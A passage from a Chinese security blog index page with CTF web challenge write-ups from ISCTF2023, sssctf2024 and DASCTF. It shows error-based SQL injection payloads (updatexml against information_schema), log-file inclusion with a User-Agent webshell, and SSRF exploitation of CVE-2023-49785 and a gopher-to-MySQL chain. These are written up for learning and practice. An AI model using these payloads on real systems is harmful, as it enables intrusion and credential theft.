class="string">&#x27;user_info_dir&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user_record</span>-&gt;user-&gt;password != <span class="variable">$password</span>) <span class="keyword">die</span>(<span class="string">&quot;Password error for User:&quot;</span>.<span class="variable">$user_record</span>-&gt;user-&gt;username);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:main.html&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们可以通过输入错误的密码来让我们的注入得到回显</p>
<p>先抓个包，注册一个账号</p>
<p><img src="./ISCTF2023.assets/image-20240517123406335.png" alt="image-20240517123406335"></p>
<p>然后故意输错密码：</p>
<p><img src="./ISCTF2023.assets/image-20240517123434562.png" alt="image-20240517123434562"></p>
<p>成功回显，可以直接拿flag了</p>
<p><img src="./ISCTF2023.assets/image-20240517123536365.png" alt="image-20240517123536365"></p>
<h2 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h2><p>根据题目可以用<code>.user.ini</code>进行文件包含，由于在之前的测试中测出许多关键符号被过滤，所以只能放弃上传:horse:，转而用文件包含漏洞</p>
<p>这里我们可以包含日志文件，利用UA传:horse:</p>
<p><img src="./ISCTF2023.assets/image-20240517164734836.png" alt="image-20240517164734836"></p>
<p>然后访问upload.php</p>
<p><img src="./ISCTF2023.assets/image-20240517164638726.png" alt="image-20240517164638726"></p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-05-07  <a class="commentCountImg" href="/2024/05/07/competition/202404/sssctf2024/#comment-container"><span class="display-none-class">46ed763c55cefb28da08802bd697364c</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="46ed763c55cefb28da08802bd697364c">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>7 分钟  <i class="fas fa-pencil-alt"> </i>1.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/05/07/competition/202404/sssctf2024/">sssctf2024-复现</a></h1><div class="content"><h1 id="计费系统"><a href="#计费系统" class="headerlink" title="计费系统"></a>计费系统</h1><p><img src="./sssctf2024.assets/image-20240507113355447.png" alt="image-20240507113355447"></p>
<p>这一页是没有注入的，只能sso登录</p>
<p>登陆之后直接进入<code>/Self/service/myMac</code>路由下寻找信息（前面的信息寻找过程略），发现存在隐写字符</p>
<p><img src="./sssctf2024.assets/image-20240507113825768.png" alt="image-20240507113825768"></p>
<p><img src="./sssctf2024.assets/image-20240507113835015.png" alt="image-20240507113835015"></p>
<p>这里要注意一下，零宽隐写字符的加密解密需要在同一个网页进行，说白了，用啥工具加密就用啥工具解密，当时做的时候忙着找各种网站尝试解密了，后面才试出来（所以下面的第一个工具会解出来乱码）</p>
<p><img src="./sssctf2024.assets/image-20240507114310864.png" alt="image-20240507114310864"></p>
<p><img src="./sssctf2024.assets/image-20240507114415958.png" alt="image-20240507114415958"></p>
<p>去到<code>/Administrator/Login</code>中查看信息</p>
<p>这里可能存在sql注入，可以尝试闭合</p>
<p><img src="./sssctf2024.assets/image-20240507114627853.png" alt="image-20240507114627853"></p>
<p>这里试出来是<code>&quot;</code>闭合，根据返回的信息推测是布尔盲注</p>
<p>直接上payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1);#  # ChallengeDatabase</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;ChallengeDatabase&#x27; limit 0,1),0x7e),1);# # users</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),0x7e),1);# # id,loginip,name,password,sso</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),0,40),0x7e),1);# 这里由于最大长度的限制，所以用到了substring来截取密码，把起始点和截取长度改一下就行 得到05d1b851-ef06-4460-9c30-4249086631d3</span><br></pre></td></tr></table></figure>

<p><img src="./sssctf2024.assets/image-20240507120047258.png" alt="image-20240507120047258"></p>
<p><img src="./sssctf2024.assets/image-20240507120400327.png" alt="image-20240507120400327"></p>
<p><img src="./sssctf2024.assets/image-20240507120450857.png" alt="image-20240507120450857"></p>
<p>得到账户名和密码后发现以下界面</p>
<p><img src="./sssctf2024.assets/image-20240507121550360.png" alt="image-20240507121550360"></p>
<p>抓个包看看</p>
<p>注意到一个dashboard跳转，发现一个之前界面中没有的aes.js</p>
<p><img src="./sssctf2024.assets/image-20240507121754961.png" alt="image-20240507121754961"></p>
<p>查看发现有以下脚本</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// const aes256cbcDecrypt = (encryptedData, key, iv) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     const decipher = crypto.createDecipheriv(&#x27;aes-256-cbc&#x27;, key, iv);</span></span><br><span class="line"><span class="comment">//     return decryptedData;</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">// const key = &quot;a1e7091c4f39e1571f5d4eaf08c7b28c&quot;;</span></span><br><span class="line"><span class="comment">// const iv = &quot;e8d4f92b75f64e7c&quot;;</span></span><br><span class="line"><span class="comment">// function readtokens(token) &#123;</span></span><br><span class="line"><span class="comment">//     return aes256cbcDecrypt(token, key, iv);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

<p>这里用到了aes256cbc方式加密，可能在之前的界面中有输出，回去看一下</p>
<p><img src="./sssctf2024.assets/image-20240507122039872.png" alt="image-20240507122039872"></p>
<p>发现一串可疑字符串，猜测就是该加密方式下的密文，拿去解密一下</p>
<p><img src="./sssctf2024.assets/image-20240507122803080.png" alt="image-20240507122803080"></p>
<p>根据题目描述，所有账户的密码相同，flag为flag账户的密码，因此我们的账户密码也是flag，上面一串字符串就是</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decipher_sssctf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    PRIMENUM1_SSSCTF = <span class="number">100537</span></span><br><span class="line">    KEYWORD_SSSCTF = <span class="number">45452</span></span><br><span class="line">    MIN_ASC = <span class="number">32</span></span><br><span class="line">    MAX_ASC = <span class="number">126</span></span><br><span class="line">    NUM_ASC = MAX_ASC - MIN_ASC + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>) - <span class="number">1</span>):</span><br><span class="line">        ch = <span class="built_in">ord</span>(<span class="built_in">str</span>[i])</span><br><span class="line">        <span class="keyword">if</span> MIN_ASC &lt;= ch &lt;= MAX_ASC:</span><br><span class="line">            ch -= MIN_ASC</span><br><span class="line">            offset = <span class="built_in">round</span>((NUM_ASC + <span class="number">1</span>) * ((KEYWORD_SSSCTF * (i + <span class="number">1</span>)) % PRIMENUM1_SSSCTF) / PRIMENUM1_SSSCTF - <span class="number">0.5</span>)</span><br><span class="line">            ch = (ch - offset) % NUM_ASC</span><br><span class="line">            <span class="keyword">if</span> ch &lt; <span class="number">0</span>:</span><br><span class="line">                ch += NUM_ASC</span><br><span class="line">            ch += MIN_ASC</span><br><span class="line">            result += <span class="built_in">chr</span>(ch)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">decrypted_string = decipher_sssctf(<span class="string">&quot;~Ju1m++tij_^%R!Cz@;e\/(TOutE&gt;9.`.XSLKt@nf8asa&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted String:&quot;</span>, decrypted_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="./sssctf2024.assets/image-20240507123225385.png" alt="image-20240507123225385"></p>
<p>根据之前出题人的提示，说可以爆出来。当时也尝试过，可惜的是解密算法没有写对，所以没有爆出来。。。</p>
<p>（当时考虑了keyword有可能是字符串的原因，所以后面就没怎么想了）</p>
<h1 id="scr1wgpt"><a href="#scr1wgpt" class="headerlink" title="scr1wgpt"></a>scr1wgpt</h1><p>这里根据提示，发现过滤了or和and，考虑用||和&amp;&amp;绕过；由于登录界面只有login failed，所以考虑时间注入</p>
<p>脚本如下：（环境有点问题，略)</p>
<p>得到用户名密码分别为：<code>Scr1w_admin</code>，<code>sssctf2024_P@ssvv0rd</code></p>
<p>GPT那有一个CVE漏洞，为<code>CVE-2023-49785</code></p>
<h2 id="CVE-2023-49785"><a href="#CVE-2023-49785" class="headerlink" title="CVE-2023-49785"></a>CVE-2023-49785</h2><p>ChatGPT-Next-Web 的 API Endpoint <code>/api/cors</code> 上存在 SSRF 漏洞，可被用于从服务器端发起任意网络请求并取得响应内容。</p>
<p><code>/api/cors</code>用于开放代理，允许未经身份验证的用户通过它发送任意HTTP请求，不过这会存在一个问题：<strong>它允许客户端通过服务器端端点访问跨域资源，从而绕过内置的浏览器保护以访问跨域资源。</strong></p>
<p>例如下图：</p>
<p><img src="./sssctf2024.assets/image-20240508144550526.png" alt="image-20240508144550526"></p>
<p>由于题目告诉我们flag是被藏在scr1wgpt-web里，所以直接访问<code>/api/cors/http/scr1wgpt-web/generator</code></p>
<p><img src="./sssctf2024.assets/image-20240508144705490.png" alt="image-20240508144705490"></p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2024-04-22  <a class="commentCountImg" href="/2024/04/22/competition/202404/dasctf-gfctf/#comment-container"><span class="display-none-class">bf127e65d496d49153fac6122201e5b9</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="bf127e65d496d49153fac6122201e5b9">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>4 分钟  <i class="fas fa-pencil-alt"> </i>0.6 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/04/22/competition/202404/dasctf-gfctf/">dasctf_gfctf四月赛复现</a></h1><div class="content"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="cool-index"><a href="#cool-index" class="headerlink" title="cool_index"></a>cool_index</h2><p>这道题当时看了看，以为是jwt伪造，结果发现不能改token，因为动token会导致系统执行<code>res.clearCookie(&quot;token&quot;);</code>，因此伪造方面只能放一放</p>
<p>这里主要分析<code>/article</code>，它是读取flag的关键</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/article&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">            <span class="keyword">let</span> index = req.<span class="property">body</span>.<span class="property">index</span>;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">index</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;你知道我要说什么&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (decoded.<span class="property">subscription</span> !== <span class="string">&quot;premium&quot;</span> &amp;&amp; index &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">                    .<span class="title function_">status</span>(<span class="number">403</span>)</span><br><span class="line">                    .<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;订阅高级会员以解锁&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            index = <span class="built_in">parseInt</span>(index);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(index) || index &gt; articles.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;你知道我要说什么&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">json</span>(articles[index]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            res.<span class="title function_">clearCookie</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;重新登录罢&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;未登录&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其实你把整个<code>server.js</code>看完之后，感觉没有利用点，因为开发者对token进行了严格地检查，防止攻击者利用token来绕过管理员的权限读取flag</p>
<p>不过注意到<code>index = parseInt(index);</code>，<code>parseInt()</code>用于将字符串转换为数字</p>
<p><img src="./dasctf-gfctf.assets/image-20240422100214436.png" alt="image-20240422100214436"></p>
<p>转换原理跟php差不多，就不赘述了</p>
<p>由于这一句是放在检测身份和页面之后的，因此可以直接传入含数字的字符串来访问flag</p>
<p><img src="./dasctf-gfctf.assets/image-20240422100419329.png" alt="image-20240422100419329"></p>
<p><img src="./dasctf-gfctf.assets/image-20240422100641059.png" alt="image-20240422100641059"></p>
<h2 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h2><p>注册一个账号登录进去，修改密码时抓包，把<code>username</code>改为<code>admin</code></p>
<p><img src="./dasctf-gfctf.assets/image-20240422100928781.png" alt="image-20240422100928781"></p>
<p>重新登录后查看图片，注意到url那一栏可以利用SSRF</p>
<p>试了一下，本地文件是读不了的，因此没法用<code>file://</code>，那就试试<code>gopher://</code></p>
<p>发现可以打3306，即mysql的默认端口</p>
<p><img src="./dasctf-gfctf.assets/image-20240422103021562.png" alt="image-20240422103021562"></p>
<p><img src="./dasctf-gfctf.assets/image-20240422103121304.png" alt="image-20240422103121304"></p>
<p>用gopherus打一下</p>
<p><img src="./dasctf-gfctf.assets/image-20240422104134992.png" alt="image-20240422104134992"></p>
<p>得到的payload进行二次编码，因为这里面有的字符解码后是个乱码，服务器在将其经过解码后可能会出现payload失效的情况</p>
<p><img src="./dasctf-gfctf.assets/image-20240422104616553.png" alt="image-20240422104616553"></p>
<p>解码后得到flag</p>
<p><img src="./dasctf-gfctf.assets/image-20240422104646167.png" alt="image-20240422104646167"></p>
<h2 id="SuiteCRM"><a href="#SuiteCRM" class="headerlink" title="SuiteCRM"></a>SuiteCRM</h2><p>提示已经说了是<code>CVE-2024-1644</code>，跟着复现就好了</p>
<p>由于环境修改了upload目录的上传权限，我就用最近才学的pear文件包含来执行命令</p>
<p><img src="./dasctf-gfctf.assets/image-20240422123738506.png" alt="image-20240422123738506"></p>
<p>直接读取flag</p>
<p><img src="./dasctf-gfctf.assets/image-20240422124307388.png" alt="image-20240422124307388"></p>
<h2 id="web1234"><a href="#web1234" class="headerlink" title="web1234"></a>web1234</h2><p>这题附件不知道跑哪去了，只能看看wp了</p>
</div><div class="index-category-tag">  <hr></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">上一页</a></div><div class="pagination-next"><a href="/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/LUFFY.jpg" alt="Ins0mn1a"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Ins0mn1a</p><p class="is-size-6 is-block">怎么才能睡个好觉呢？</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Guiyang!!!</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Luffys93" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Luffys93"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:1725237709@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">最新评论</h3><span class="body_hot_comment">加载中，最新评论有1分钟缓存...</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-07-29T05:34:18.859Z">2024-07-29</time></p><p class="title"><a href="/2024/07/29/hello-world/">Hello World</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-07-03T07:58:06.000Z">2024-07-03</time></p><p class="title"><a href="/2024/07/03/Webbbb/Others/Shell/">学习web安全的那些二三事-反弹Shell篇</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-06-27T05:54:49.000Z">2024-06-27</time></p><p class="title"><a href="/2024/06/27/Webbbb/linux/linux-second/">linux-second</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-06-25T08:20:52.000Z">2024-06-25</time></p><p class="title"><a href="/2024/06/25/Webbbb/linux/linux-first/">学习web安全的那些二三事-linux篇（1）</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-06-25T00:01:30.000Z">2024-06-25</time></p><p class="title"><a href="/2024/06/25/Webbbb/PHP/php-first/">学习web安全的那些二三事-php篇（1）</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Scr1w%E5%B9%B3%E5%8F%B0/"><span class="level-start"><span class="level-item">Scr1w平台</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Vulhub/"><span class="level-start"><span class="level-item">Vulhub</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/buu%E5%B9%B3%E5%8F%B0/"><span class="level-start"><span class="level-item">buu平台</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E6%AF%94%E8%B5%9B/"><span class="level-start"><span class="level-item">比赛</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E8%AE%A1%E7%BD%91/"><span class="level-start"><span class="level-item">计网</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2024/07/"><span class="level-start"><span class="level-item">七月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2024/06/"><span class="level-start"><span class="level-item">六月 2024</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2024/05/"><span class="level-start"><span class="level-item">五月 2024</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2024/04/"><span class="level-start"><span class="level-item">四月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2024/03/"><span class="level-start"><span class="level-item">三月 2024</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">INSOMNIA.__逃离失眠__</a><p class="size-small"><span>&copy; 2024 Ins0mn1a</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于各位师傅与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "❤️本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！❤️";
        }var now = new Date();setInterval("createTime('2024/7/29 21:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="9422021582" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('Ov23liIz1bPooLBfW0Cm','8f8f49427fa732912dade765d516294e964b4f41','LuffyS93','Comments_of_blog',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
